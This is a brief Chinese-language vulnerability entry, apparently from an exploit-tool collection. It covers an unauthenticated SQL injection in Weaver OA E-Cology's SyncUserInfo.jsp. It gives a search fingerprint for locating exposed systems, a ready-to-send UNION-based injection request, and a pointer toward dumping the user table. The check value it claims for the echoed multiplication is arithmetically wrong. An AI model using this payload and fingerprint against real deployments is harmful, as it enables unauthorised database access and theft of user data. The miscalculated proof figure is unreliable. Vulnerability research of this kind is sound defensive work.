---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微OA SyncUserInfo.jsp SQL注入漏洞

## 漏洞描述

泛微OA E-Cology 的 `/mobile/plugin/SyncUserInfo.jsp` 接口中 `userIdentifiers` 参数存在SQL注入漏洞。攻击者无需登录，通过构造注入语句可执行任意 SQL 查询，获取数据库敏感信息。

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null HTTP/1.1
```

其中 `str(98989*44313)` 的计算结果（4370323157）会回显在响应中，证明 SQL 语句被成功执行。可进一步构造 UNION 语句读取用户表等敏感数据。
